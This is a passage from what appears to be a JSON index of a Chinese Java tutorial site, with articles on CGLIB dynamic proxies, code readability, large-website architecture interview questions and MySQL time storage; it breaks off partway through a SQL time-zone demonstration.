实际是属于一个开源项目，如果你要使用它的话，需要手动添加相关依赖。\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;cglib\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;cglib\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.3.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 1.实现一个使用阿里云发送短信的类\npackage github.javaguide.dynamicProxy.cglibDynamicProxy; public class AliSmsService { public String send(String message) { System.out.println(\u0026#34;send message:\u0026#34; + message); return message; } } 2.自定义 MethodInterceptor（方法拦截器）\nimport net.sf.cglib.proxy.MethodInterceptor; import net.sf.cglib.proxy.MethodProxy; import java.lang.reflect.Method; /** * 自定义MethodInterceptor */ public class DebugMethodInterceptor implements MethodInterceptor { /** * @param o 代理对象（增强的对象） * @param method 被拦截的方法（需要增强的方法） * @param args 方法入参 * @param methodProxy 用于调用原始方法 */ @Override public Object intercept(Object o, Method method, Object[] args, MethodProxy methodProxy) throws Throwable { //调用方法之前，我们可以添加自己的操作  System.out.println(\u0026#34;before method \u0026#34; + method.getName()); Object object = methodProxy.invokeSuper(o, args); //调用方法之后，我们同样可以添加自己的操作  System.out.println(\u0026#34;after method \u0026#34; + method.getName()); return object; } } 3.获取代理类\nimport net.sf.cglib.proxy.Enhancer; public class CglibProxyFactory { public static Object getProxy(Class\u0026lt;?\u0026gt; clazz) { // 创建动态代理增强类  Enhancer enhancer = new Enhancer(); // 设置类加载器  enhancer.setClassLoader(clazz.getClassLoader()); // 设置被代理类  enhancer.setSuperclass(clazz); // 设置方法拦截器  enhancer.setCallback(new DebugMethodInterceptor()); // 创建代理类  return enhancer.create(); } } 4.实际使用\nAliSmsService aliSmsService = (AliSmsService) CglibProxyFactory.getProxy(AliSmsService.class); aliSmsService.send(\u0026#34;java\u0026#34;); 运行上述代码之后，控制台打印出：\nbefore method send send message:java after method send 3.3. JDK 动态代理和 CGLIB 动态代理对比     JDK 动态代理只能代理实现了接口的类或者直接代理接口，而 CGLIB 可以代理未实现任何接口的类。 另外， CGLIB 动态代理是通过生成一个被代理类的子类来拦截被代理类的方法调用，因此不能代理声明为 final 类型的类和方法。 就二者的效率来说，大部分情况都是 JDK 动态代理更优秀，随着 JDK 版本的升级，这个优势更加明显。  4. 静态代理和动态代理的对比     灵活性 ：动态代理更加灵活，不需要必须实现接口，可以直接代理实现类，并且可以不需要针对每个目标类都创建一个代理类。另外，静态代理中，接口一旦新增加方法，目标对象和代理对象都要进行修改，这是非常麻烦的！ JVM 层面 ：静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。而动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。  5. 总结    这篇文章中主要介绍了代理模式的两种实现：静态代理以及动态代理。涵盖了静态代理和动态代理实战、静态代理和动态代理的区别、JDK 动态代理和 Cglib 动态代理区别等内容。\n文中涉及到的所有源码，你可以在这里找到：https://github.com/Snailclimb/guide-rpc-framework-learning/tree/master/src/main/java/github/javaguide/proxy 。\n"},{"id":325,"href":"/%E7%AC%94%E8%AE%B0/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/","title":"代码可读性","parent":"笔记","content":" 一、可读性的重要性 二、用名字表达代码含义 三、名字不能带来歧义 四、良好的代码风格 五、为何编写注释 六、如何编写注释 七、提高控制流的可读性 八、拆分长表达式 九、变量与可读性 十、抽取函数 十一、一次只做一件事 十二、用自然语言表述代码 十三、减少代码量 参考资料  一、可读性的重要性    编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。\n可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。\n只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。\n二、用名字表达代码含义    一些比较有表达力的单词：\n   单词 可替代单词     send deliver、dispatch、announce、distribute、route   find search、extract、locate、recover   start launch、create、begin、open   make create、set up、build、generate、compose、add、new    使用 i、j、k 作为循环迭代器的名字过于简单，user_i、member_i 这种名字会更有表达力。因为循环层次越多，代码越难理解，有表达力的迭代器名字可读性会更高。\n为名字添加形容词等信息能让名字更具有表达力，但是名字也会变长。名字长短的准则是：作用域越大，名字越长。因此只有在短作用域才能使用一些简单名字。\n三、名字不能带来歧义    起完名字要思考一下别人会对这个名字有何解读，会不会误解了原本想表达的含义。\n布尔相关的命名加上 is、can、should、has 等前缀。\n  用 min、max 表示数量范围；\n  用 first、last 表示访问空间的包含范围；\n  begin、end 表示访问空间的排除范围，即 end 不包含尾部。\n  \n四、良好的代码风格    适当的空行和缩进。\n排列整齐的注释：\nint a = 1; // 注释 int b = 11; // 注释 int c = 111; // 注释 语句顺序不能随意，比如与 html 表单相关联的变量的赋值应该和表单在 html 中的顺序一致。\n五、为何编写注释    阅读代码首先会注意到注释，如果注释没太大作用，那么就会浪费代码阅读的时间。那些能直接看出含义的代码不需要写注释，特别是不需要为每个方法都加上注释，比如那些简单的 getter 和 setter 方法，为这些方法写注释反而让代码可读性更差。\n不能因为有注释就随便起个名字，而是争取起个好名字而不写注释。\n可以用注释来记录采用当前解决办法的思考过程，从而让读者更容易理解代码。\n注释用来提醒一些特殊情况。\n用 TODO 等做标记：\n   标记 用法     TODO 待做   FIXME 待修复   HACK 粗糙的解决方案   XXX 危险！这里有重要的问题    六、如何编写注释    尽量简洁明了：\n// The first String is student\u0026#39;s name // The Second Integer is student\u0026#39;s score Map\u0026lt;String, Integer\u0026gt; scoreMap = new HashMap\u0026lt;\u0026gt;(); // Student\u0026#39;s name -\u0026gt; Student\u0026#39;s score Map\u0026lt;String, Integer\u0026gt; scoreMap = new HashMap\u0026lt;\u0026gt;(); 添加测试用例来说明：\n// ... // Example: add(1, 2), return 3 int add(int x, int y) { return x + y; } 使用专业名词来缩短概念上的解释，比如用设计模式名来说明代码。\n七、提高控制流的可读性    条件表达式中，左侧是变量，右侧是常数。比如下面第一个语句正确：\nif (len \u0026lt; 10) if (10 \u0026gt; len) 只有在逻辑简单的情况下使用 ? : 三目运算符来使代码更紧凑，否则应该拆分成 if / else；\ndo / while 的条件放在后面，不够简单明了，并且会有一些迷惑的地方，最好使用 while 来代替。\n如果只有一个 goto 目标，那么 goto 尚且还能接受，但是过于复杂的 goto 会让代码可读性特别差，应该避免使用 goto。\n在嵌套的循环中，用一些 return 语句往往能减少嵌套的层数。\n八、拆分长表达式    长表达式的可读性很差，可以引入一些解释变量从而拆分表达式：\nif line.split(\u0026#39;:\u0026#39;)[0].strip() == \u0026#34;root\u0026#34;: ... username = line.split(\u0026#39;:\u0026#39;)[0].strip() if username == \u0026#34;root\u0026#34;: ... 使用摩根定理简化一些逻辑表达式：\nif (!a \u0026amp;\u0026amp; !b) { ... } if (!(a || b)) { ... } 九、变量与可读性    去除控制流变量 。在循环中通过使用 break 或者 return 可以减少控制流变量的使用。\nboolean done = false; while (/* condition */ \u0026amp;\u0026amp; !done) { ... if ( ... ) { done = true; continue; } } while(/* condition */) { ... if ( ... ) { break; } } 减小变量作用域 。作用域越小，越容易定位到变量所有使用的地方。\nJavaScript 可以用闭包减小作用域。以下代码中 submit_form 是函数变量，submitted 变量控制函数不会被提交两次。第一个实现中 submitted 是全局变量，第二个实现把 submitted 放到匿名函数中，从而限制了起作用域范围。\nsubmitted = false; var submit_form = function(form_name) { if (submitted) { return; } submitted = true; }; var submit_form = (function() { var submitted = false; return function(form_name) { if(submitted) { return; } submitted = true; } }()); // () 使得外层匿名函数立即执行 JavaScript 中没有用 var 声明的变量都是全局变量，而全局变量很容易造成迷惑，因此应当总是用 var 来声明变量。\n变量定义的位置应当离它使用的位置最近。\n实例解析\n在一个网页中有以下文本输入字段：\n\u0026lt;input type = \u0026#34;text\u0026#34; id = \u0026#34;input1\u0026#34; value = \u0026#34;a\u0026#34;\u0026gt; \u0026lt;input type = \u0026#34;text\u0026#34; id = \u0026#34;input2\u0026#34; value = \u0026#34;b\u0026#34;\u0026gt; \u0026lt;input type = \u0026#34;text\u0026#34; id = \u0026#34;input3\u0026#34; value = \u0026#34;\u0026#34;\u0026gt; \u0026lt;input type = \u0026#34;text\u0026#34; id = \u0026#34;input4\u0026#34; value = \u0026#34;d\u0026#34;\u0026gt; 现在要接受一个字符串并把它放到第一个空的 input 字段中，初始实现如下：\nvar setFirstEmptyInput = function(new_alue) { var found = false; var i = 1; var elem = document.getElementById(\u0026#39;input\u0026#39; + i); while (elem != null) { if (elem.value === \u0026#39;\u0026#39;) { found = true; break; } i++; elem = document.getElementById(\u0026#39;input\u0026#39; + i); } if (found) elem.value = new_value; return elem; } 以上实现有以下问题：\n found 可以去除； elem 作用域过大； 可以用 for 循环代替 while 循环；  var setFirstEmptyInput = function(new_value) { for (var i = 1; true; i++) { var elem = document.getElementById(\u0026#39;input\u0026#39; + i); if (elem === null) { return null; } if (elem.value === \u0026#39;\u0026#39;) { elem.value = new_value; return elem; } } }; 十、抽取函数    工程学就是把大问题拆分成小问题再把这些问题的解决方案放回一起。\n首先应该明确一个函数的高层次目标，然后对于不是直接为了这个目标工作的代码，抽取出来放到独立的函数中。\n介绍性的代码：\nint findClostElement(int[] arr) { int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i \u0026lt; arr.length; i++) { int x = ...; int y = ...; int z = ...; int value = x * y * z; int dist = Math.sqrt(Math.pow(value, 2), Math.pow(arr[i], 2)); if (dist \u0026lt; clostDist) { clostIdx = i; clostDist = value; } } return clostIdx; } 以上代码中循环部分主要计算距离，这部分不属于代码高层次目标，高层次目标是寻找最小距离的值，因此可以把这部分代替提取到独立的函数中。这样做也带来一个额外的好处有：可以单独进行测试、可以快速找到程序错误并修改。\npublic int findClostElement(int[] arr) { int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i \u0026lt; arr.length; i++) { int dist = computDist(arr, i); if (dist \u0026lt; clostDist) { clostIdx = i; clostDist = value; } } return clostIdx; } 并不是函数抽取的越多越好，如果抽取过多，在阅读代码的时候可能需要不断跳来跳去。只有在当前函数不需要去了解某一块代码细节而能够表达其内容时，把这块代码抽取成子函数才是好的。\n函数抽取也用于减小代码的冗余。\n十一、一次只做一件事    只做一件事的代码很容易让人知道其要做的事；\n基本流程：列出代码所做的所有任务；把每个任务拆分到不同的函数，或者不同的段落。\n十二、用自然语言表述代码    先用自然语言书写代码逻辑，也就是伪代码，然后再写代码，这样代码逻辑会更清晰。\n十三、减少代码量    不要过度设计，编码过程会有很多变化，过度设计的内容到最后往往是无用的。\n多用标准库实现。\n参考资料     Dustin, Boswell, Trevor, 等. 编写可读代码的艺术 [M]. 机械工业出版社, 2012.  "},{"id":326,"href":"/%E7%AC%94%E8%AE%B0/%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83/","title":"代码风格规范","parent":"笔记","content":" Twitter Java Style Guide Google Java Style Guide 阿里巴巴Java开发手册  "},{"id":327,"href":"/system-design/website-architecture/%E5%85%B3%E4%BA%8E%E5%A4%A7%E5%9E%8B%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E4%BD%A0%E4%B8%8D%E5%BE%97%E4%B8%8D%E6%87%82%E7%9A%8410%E4%B8%AA%E9%97%AE%E9%A2%98/","title":"关于大型网站系统架构你不得不懂的10个问题","parent":"website-architecture","content":"下面这些问题都是一线大厂的真实面试问题，不论是对你面试还是说拓宽知识面都很有帮助。之前发过一篇8 张图读懂大型网站技术架构 可以作为不太了解大型网站系统技术架构朋友的入门文章。\n 1. 你使用过哪些组件或者方法来提升网站性能,可用性以及并发量 2. 设计高可用系统的常用手段 3. 现代互联网应用系统通常具有哪些特点? 4. 谈谈你对微服务领域的了解和认识 5. 谈谈你对 Dubbo 和 Spring Cloud 的认识(两者关系) 6. 性能测试了解吗?说说你知道的性能测试工具? 7. 对于一个单体应用系统,随着产品使用的用户越来越多,网站的流量会增加,最终单台服务器无法处理那么大的流量怎么办? 8. 大表优化的常见手段 9. 在系统中使用消息队列能带来什么好处?  1) 通过异步处理提高系统性能   2) 降低系统耦合性 10. 说说自己对 CAP 定理,BASE 理论的了解  CAP 定理 BASE 理论   参考  1. 你使用过哪些组件或者方法来提升网站性能,可用性以及并发量     提高硬件能力、增加系统服务器。（当服务器增加到某个程度的时候系统所能提供的并发访问量几乎不变，所以不能根本解决问题） 使用缓存（本地缓存：本地可以使用JDK自带的 Map、Guava Cache.分布式缓存：Redis、Memcache.本地缓存不适用于提高系统并发量，一般是用在程序中。比如Spring是如何实现单例的呢？大家如果看过源码的话，应该知道，S把已经初始过的变量放在一个Map中，下次再要使用这个变量的时候，先判断Map中有没有，这也就是系统中常见的单例模式的实现。） 消息队列 （解耦+削峰+异步） 采用分布式开发 （不同的服务部署在不同的机器节点上，并且一个服务也可以部署在多台机器上，然后利用 Nginx 负载均衡访问。这样就解决了单点部署(All In)的缺点，大大提高的系统并发量） 数据库分库（读写分离）、分表（水平分表、垂直分表） 采用集群 （多台机器提供相同的服务） CDN 加速 (将一些静态资源比如图片、视频等等缓存到离用户最近的网络节点) 浏览器缓存 使用合适的连接池（数据库连接池、线程池等等） 适当使用多线程进行开发。  2. 设计高可用系统的常用手段     降级： 服务降级是当服务器压力剧增的情况下，根据当前业务情况及流量对一些服务和页面有策略的降级，以此释放服务器资源以保证核心任务的正常运行。降级往往会指定不同的级别，面临不同的异常等级执行不同的处理。根据服务方式：可以拒接服务，可以延迟服务，也有时候可以随机服务。根据服务范围：可以砍掉某个功能，也可以砍掉某些模块。总之服务降级需要根据不同的业务需求采用不同的降级策略。主要的目的就是服务虽然有损但是总比没有好； 限流： 防止恶意请求流量、恶意攻击，或者防止流量超出系统峰值； 缓存： 避免大量请求直接落到数据库，将数据库击垮； 超时和重试机制： 避免请求堆积造成雪崩； 回滚机制： 快速修复错误版本。  3. 现代互联网应用系统通常具有哪些特点?     高并发，大流量； 高可用：系统7×24小时不间断服务； 海量数据：需要存储、管理海量数据，需要使用大量服务器； 用户分布广泛，网络情况复杂：许多大型互联网都是为全球用户提供服务的，用户分布范围广，各地网络情况千差万别； 安全环境恶劣：由于互联网的开放性，使得互联网更容易受到攻击，大型网站几乎每天都会被黑客攻击； 需求快速变更，发布频繁：和传统软件的版本发布频率不同，互联网产品为快速适应市场，满足用户需求，其产品发布频率是极高的； 渐进式发展：与传统软件产品或企业应用系统一开始就规划好全部的功能和非功能需求不同，几乎所有的大型互联网网站都是从一个小网站开始，渐进地发展起来。  4. 谈谈你对微服务领域的了解和认识    现在大公司都在用并且未来的趋势都是 Spring Cloud，而阿里开源的 Spring Cloud Alibaba 也是 Spring Cloud 规范的实现 。\n我们通常把 Spring Cloud 理解为一系列开源组件的集合，但是 Spring Cloud并不是等同于 Spring Cloud Netflix 的 Ribbon、Feign、Eureka（停止更新）、Hystrix 这一套组件，而是抽象了一套通用的开发模式。它的目的是通过抽象出这套通用的模式，让开发者更快更好地开发业务。但是这套开发模式运行时的实际载体，还是依赖于 RPC、网关、服务发现、配置管理、限流熔断、分布式链路跟踪等组件的具体实现。\nSpring Cloud Alibaba 是官方认证的新一套 Spring Cloud 规范的实现,Spring Cloud Alibaba 是一套国产开源产品集合，后续还会有中文 reference 和一些原理分析文章，所以，这对于国内的开发者是非常棒的一件事。阿里的这一举动势必会推动国内微服务技术的发展，因为在没有 Spring Cloud Alibaba 之前，我们的第一选择是 Spring Cloud Netflix，但是它们的文档都是英文的，出问题后排查也比较困难， 在国内并不是有特别多的人精通。Spring Cloud Alibaba 由阿里开源组件和阿里云产品组件两部分组成，其致力于提供微服务一站式解决方案，方便开发者通过 Spring Cloud 编程模型轻松开发微服务应用。\n另外，Apache Dubbo Ecosystem 是围绕 Apache Dubbo 打造的微服务生态，是经过生产验证的微服务的最佳实践组合。在阿里巴巴的微服务解决方案中，Dubbo、Nacos 和 Sentinel，以及后续将开源的微服务组件，都是 Dubbo EcoSystem 的一部分。阿里后续也会将 Dubbo EcoSystem 集成到 Spring Cloud 的生态中。\n5. 谈谈你对 Dubbo 和 Spring Cloud 的认识(两者关系)    具体可以看公众号-阿里巴巴中间件的这篇文章:独家解读：Dubbo Ecosystem - 从微服务框架到微服务生态\nDubbo 与 Spring Cloud 并不是竞争关系，Dubbo 作为成熟的 RPC 框架，其易用性、扩展性和健壮性已得到业界的认可。未来 Dubbo 将会作为 Spring Cloud Alibaba 的 RPC 组件，并与 Spring Cloud 原生的 Feign 以及 RestTemplate 进行无缝整合，实现“零”成本迁移。\n在阿里巴巴的微服务解决方案中，Dubbo、Nacos 和 Sentinel，以及后续将开源的微服务组件，都是 Dubbo EcoSystem 的一部分。我们后续也会将 Dubbo EcoSystem 集成到 Spring Cloud 的生态中。\n6. 性能测试了解吗?说说你知道的性能测试工具?    性能测试指通过自动化的测试工具模拟多种正常、峰值以及异常负载条件来对系统的各项性能指标进行测试。性能测试是总称，通常细分为：\n 基准测试： 在给系统施加较低压力时，查看系统的运行状况并记录相关数做为基础参考 负载测试： 是指对系统不断地增加压力或增加一定压力下的持续时间，直到系统的某项或多项性能指标达到安全临界值，例如某种资源已经达到饱和状态等 。此时继续加压，系统处理能力会下降。 压力测试： 超过安全负载情况下，不断施加压力（增加并发请求），直到系统崩溃或无法处理任何请求，依此获得系统最大压力承受能力。 稳定性测试： 被测试系统在特定硬件、软件、网络环境下，加载一定业务压力（模拟生产环境不同时间点、不均匀请求，呈波浪特性）运行一段较长时间，以此检测系统是否稳定。  后端程序员或者测试平常比较常用的测试工具是 JMeter（官网：https://jmeter.apache.org/）。Apache JMeter 是一款基于Java的压力测试工具(100％纯Java应用程序)，旨在加载测试功能行为和测量性能。它最初被设计用于 Web 应用测试但后来扩展到其他测试领域。\n7. 对于一个单体应用系统,随着产品使用的用户越来越多,网站的流量会增加,最终单台服务器无法处理那么大的流量怎么办?    这个时候就要考虑扩容了。《亿级流量网站架构核心技术》这本书上面介绍到我们可以考虑下面几步来解决这个问题：\n 第一步，可以考虑简单的扩容来解决问题。比如增加系统的服务器，提高硬件能力等等。 第二步，如果简单扩容搞不定，就需要水平拆分和垂直拆分数据／应用来提升系统的伸缩性，即通过扩容提升系统负载能力。 第三步，如果通过水平拆分／垂直拆分还是搞不定，那就需要根据现有系统特性，架构层面进行重构甚至是重新设计，即推倒重来。  对于系统设计，理想的情况下应支持线性扩容和弹性扩容，即在系统瓶颈时，只需要增加机器就可以解决系统瓶颈，如降低延迟提升吞吐量，从而实现扩容需求。\n如果你想扩容，则支持水平/垂直伸缩是前提。在进行拆分时，一定要清楚知道自己的目的是什么，拆分后带来的问题如何解决，拆分后如果没有得到任何收益就不要为了 拆而拆，即不要过度拆分，要适合自己的业务。\n8. 大表优化的常见手段    当MySQL单表记录数过大时，数据库的CRUD性能会明显下降，一些常见的优化措施如下：\n 限定数据的范围： 务必禁止不带任何限制数据范围条件的查询语句。比如：我们当用户在查询订单历史的时候，我们可以控制在一个月的范围内； 读/写分离： 经典的数据库拆分方案，主库负责写，从库负责读； 垂直分区： 根据数据库里面数据表的相关性进行拆分。 例如，用户表中既有用户的登录信息又有用户的基本信息，可以将用户表拆分成两个单独的表，甚至放到单独的库做分库。简单来说垂直拆分是指数据表列的拆分，把一张列比较多的表拆分为多张表。 如下图所示，这样来说大家应该就更容易理解了。垂直拆分的优点： 可以使得行数据变小，在查询时减少读取的Block数，减少I/O次数。此外，垂直分区可以简化表的结构，易于维护。垂直拆分的缺点： 主键会出现冗余，需要管理冗余列，并会引起Join操作，可以通过在应用层进行Join来解决。此外，垂直分区会让事务变得更加复杂； 水平分区： 保持数据表结构不变，通过某种策略存储数据分片。这样每一片数据分散到不同的表或者库中，达到了分布式的目的。 水平拆分可以支撑非常大的数据量。 水平拆分是指数据表行的拆分，表的行数超过200万行时，就会变慢，这时可以把一张的表的数据拆成多张表来存放。举个例子：我们可以将用户信息表拆分成多个用户信息表，这样就可以避免单一表数据量过大对性能造成影响。水平拆分可以支持非常大的数据量。需要注意的一点是:分表仅仅是解决了单一表数据过大的问题，但由于表的数据还是在同一台机器上，其实对于提升MySQL并发能力没有什么意义，所以 水平拆分最好分库 。水平拆分能够 支持非常大的数据量存储，应用端改造也少，但 分片事务难以解决 ，跨界点Join性能较差，逻辑复杂。《Java工程师修炼之道》的作者推荐 尽量不要对数据进行分片，因为拆分会带来逻辑、部署、运维的各种复杂度 ，一般的数据表在优化得当的情况下支撑千万以下的数据量是没有太大问题的。如果实在要分片，尽量选择客户端分片架构，这样可以减少一次和中间件的网络I/O。  下面补充一下数据库分片的两种常见方案：\n 客户端代理： 分片逻辑在应用端，封装在jar包中，通过修改或者封装JDBC层来实现。 当当网的 Sharding-JDBC 、阿里的TDDL是两种比较常用的实现。 中间件代理： 在应用和数据中间加了一个代理层。分片逻辑统一维护在中间件服务中。 我们现在谈的 Mycat 、360的Atlas、网易的DDB等等都是这种架构的实现。  9. 在系统中使用消息队列能带来什么好处?    《大型网站技术架构》第四章和第七章均有提到消息队列对应用性能及扩展性的提升。\n1) 通过异步处理提高系统性能    如上图，在不使用消息队列服务器的时候，用户的请求数据直接写入数据库，在高并发的情况下数据库压力剧增，使得响应速度变慢。但是在使用消息队列之后，用户的请求数据发送给消息队列之后立即 返回，再由消息队列的消费者进程从消息队列中获取数据，异步写入数据库。由于消息队列服务器处理速度快于数据库（消息队列也比数据库有更好的伸缩性），因此响应速度得到大幅改善。\n通过以上分析我们可以得出消息队列具有很好的削峰作用的功能——即通过异步处理，将短时间高并发产生的事务消息存储在消息队列中，从而削平高峰期的并发事务。 举例：在电子商务一些秒杀、促销活动中，合理使用消息队列可以有效抵御促销活动刚开始大量订单涌入对系统的冲击。如下图所示： 因为用户请求数据写入消息队列之后就立即返回给用户了，但是请求数据在后续的业务校验、写数据库等操作中可能失败。因此使用消息队列进行异步处理之后，需要适当修改业务流程进行配合，比如用户在提交订单之后，订单数据写入消息队列，不能立即返回用户订单提交成功，需要在消息队列的订单消费者进程真正处理完该订单之后，甚至出库后，再通过电子邮件或短信通知用户订单成功，以免交易纠纷。这就类似我们平时手机订火车票和电影票。\n2) 降低系统耦合性    我们知道模块分布式部署以后聚合方式通常有两种：1.分布式消息队列和2.分布式服务。\n 先来简单说一下分布式服务：\n 目前使用比较多的用来构建SOA（Service Oriented Architecture面向服务体系结构）的分布式服务框架是阿里巴巴开源的Dubbo.如果想深入了解Dubbo的可以看我写的关于Dubbo的这一篇文章：《高性能优秀的服务框架-dubbo介绍》：https://juejin.im/post/5acadeb1f265da2375072f9c\n 再来谈我们的分布式消息队列：\n 我们知道如果模块之间不存在直接调用，那么新增模块或者修改模块就对其他模块影响较小，这样系统的可扩展性无疑更好一些。\n我们最常见的事件驱动架构类似生产者消费者模式，在大型网站中通常用利用消息队列实现事件驱动结构。如下图所示： 消息队列使利用发布-订阅模式工作，消息发送者（生产者）发布消息，一个或多个消息接受者（消费者）订阅消息。 从上图可以看到消息发送者（生产者）和消息接受者（消费者）之间没有直接耦合，消息发送者将消息发送至分布式消息队列即结束对消息的处理，消息接受者从分布式消息队列获取该消息后进行后续处理，并不需要知道该消息从何而来。对新增业务，只要对该类消息感兴趣，即可订阅该消息，对原有系统和业务没有任何影响，从而实现网站业务的可扩展性设计。\n消息接受者对消息进行过滤、处理、包装后，构造成一个新的消息类型，将消息继续发送出去，等待其他消息接受者订阅该消息。因此基于事件（消息对象）驱动的业务架构可以是一系列流程。\n另外为了避免消息队列服务器宕机造成消息丢失，会将成功发送到消息队列的消息存储在消息生产者服务器上，等消息真正被消费者服务器处理后才删除消息。在消息队列服务器宕机后，生产者服务器会选择分布式消息队列服务器集群中的其他服务器发布消息。\n备注： 不要认为消息队列只能利用发布-订阅模式工作，只不过在解耦这个特定业务环境下是使用发布-订阅模式的，比如在我们的ActiveMQ消息队列中还有点对点工作模式，具体的会在后面的文章给大家详细介绍，这一篇文章主要还是让大家对消息队列有一个更透彻的了解。\n 这个问题一般会在上一个问题问完之后，紧接着被问到。“使用消息队列会带来什么问题？”这个问题要引起重视，一般我们都会考虑使用消息队列会带来的好处而忽略它带来的问题！\n 10. 说说自己对 CAP 定理,BASE 理论的了解    CAP 定理    在理论计算机科学中，CAP定理（CAP theorem），又被称作布鲁尔定理（Brewer\u0026rsquo;s theorem），它指出对于一个分布式计算系统来说，不可能同时满足以下三点：\n 一致性（Consistence） :所有节点访问同一份最新的数据副本 可用性（Availability）:每次请求都能获取到非错的响应——但是不保证获取的数据为最新数据 分区容错性（Partition tolerance） : 分布式系统在遇到某节点或网络分区故障的时候，仍然能够对外提供满足一致性和可用性的服务。  CAP仅适用于原子读写的NOSQL场景中，并不适合数据库系统。现在的分布式系统具有更多特性比如扩展性、可用性等等，在进行系统设计和开发时，我们不应该仅仅局限在CAP问题上。\n注意：不是所谓的3选2（不要被网上大多数文章误导了）:\n大部分人解释这一定律时，常常简单的表述为：“一致性、可用性、分区容忍性三者你只能同时达到其中两个，不可能同时达到”。实际上这是一个非常具有误导性质的说法，而且在CAP理论诞生12年之后，CAP之父也在2012年重写了之前的论文。\n当发生网络分区的时候，如果我们要继续服务，那么强一致性和可用性只能2选1。也就是说当网络分区之后P是前提，决定了P之后才有C和A的选择。也就是说分区容错性（Partition tolerance）我们是必须要实现的。\n我在网上找了很多文章想看一下有没有文章提到这个不是所谓的3选2，用百度半天没找到了一篇，用谷歌搜索找到一篇比较不错的，如果想深入学习一下CAP就看这篇文章把，我这里就不多BB了：《分布式系统之CAP理论》 ： https://www.cnblogs.com/hxsyl/p/4381980.html\nBASE 理论    BASE 是 Basically Available（基本可用） 、Soft-state（软状态） 和 Eventually Consistent（最终一致性） 三个短语的缩写。BASE理论是对CAP中一致性和可用性权衡的结果，其来源于对大规模互联网系统分布式实践的总结，是基于CAP定理逐步演化而来的，它大大降低了我们对系统的要求。\nBASE理论的核心思想： 即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。也就是牺牲数据的一致性来满足系统的高可用性，系统中一部分数据不可用或者不一致时，仍需要保持系统整体“主要可用”。\nBASE理论三要素：\n 基本可用： 基本可用是指分布式系统在出现不可预知故障的时候，允许损失部分可用性。但是，这绝不等价于系统不可用。 比如： ①响应时间上的损失:正常情况下，一个在线搜索引擎需要在0.5秒之内返回给用户相应的查询结果，但由于出现故障，查询结果的响应时间增加了1~2秒；②系统功能上的损失：正常情况下，在一个电子商务网站上进行购物的时候，消费者几乎能够顺利完成每一笔订单，但是在一些节日大促购物高峰的时候，由于消费者的购物行为激增，为了保护购物系统的稳定性，部分消费者可能会被引导到一个降级页面； 软状态： 软状态指允许系统中的数据存在中间状态，并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据同步的过程存在延时； 最终一致性： 最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性。  参考     《大型网站技术架构》 《亿级流量网站架构核心技术》 《Java工程师修炼之道》 https://www.cnblogs.com/puresoul/p/5456855.html  "},{"id":328,"href":"/database/mysql/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E6%97%B6%E9%97%B4%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/","title":"关于数据库存储时间的一点思考","parent":"mysql","content":"我们平时开发中不可避免的就是要存储时间，比如我们要记录操作表中这条记录的时间、记录转账的交易时间、记录出发时间等等。你会发现时间这个东西与我们开发的联系还是非常紧密的，用的好与不好会给我们的业务甚至功能带来很大的影响。所以，我们有必要重新出发，好好认识一下这个东西。\n这是一篇短小精悍的文章，仔细阅读一定能学到不少东西！\n1.切记不要用字符串存储日期    我记得我在大学的时候就这样干过，而且现在很多对数据库不太了解的新手也会这样干，可见，这种存储日期的方式的优点还是有的，就是简单直白，容易上手。\n但是，这是不正确的做法，主要会有下面两个问题：\n 字符串占用的空间更大！ 字符串存储的日期效率比较低（逐个字符进行比对），无法用日期相关的 API 进行计算和比较。  2.Datetime 和 Timestamp 之间抉择    Datetime 和 Timestamp 是 MySQL 提供的两种比较相似的保存时间的数据类型。他们两者究竟该如何选择呢？\n通常我们都会首选 Timestamp。 下面说一下为什么这样做!\n2.1 DateTime 类型没有时区信息    DateTime 类型是没有时区信息的（时区无关） ，DateTime 类型保存的时间都是当前会话所设置的时区对应的时间。这样就会有什么问题呢？当你的时区更换之后，比如你的服务器更换地址或者更换客户端连接时区设置的话，就会导致你从数据库中读出的时间错误。不要小看这个问题，很多系统就是因为这个问题闹出了很多笑话。\nTimestamp 和时区有关。Timestamp 类型字段的值会随着服务器时区的变化而变化，自动换算成相应的时间，说简单点就是在不同时区，查询到同一个条记录此字段的值会不一样。\n下面实际演示一下！\n建表 SQL 语句：\nCREATE TABLE `time_zone_test` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `date_time` datetime DEFAULT NULL, `time_stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; 插入数据：\nINSERT INTO time_zone_test(date_time,time_stamp) VALUES(NOW(),NOW()); 查看数据：\nselect date_time,time_stamp from time_zone_test; 结果：\n+---------------------+---------------------+ | date_time | time_stamp | +---------------------+---------------------+ | 2020-01-11 09:53:32 | 2020-01-11 09:53:32 | +---------------------+---------------------+ 现在我们运行\n修改当前会话的时区:\nset time_zone=\u0026#39;+8:00\u0026#39;; 再次查看数据：\n+---------------------+---------------------+ | date_time | time_stamp | +---------------------+---------------------+ | 2020-01-11 09:53:32 | 2020-01-11 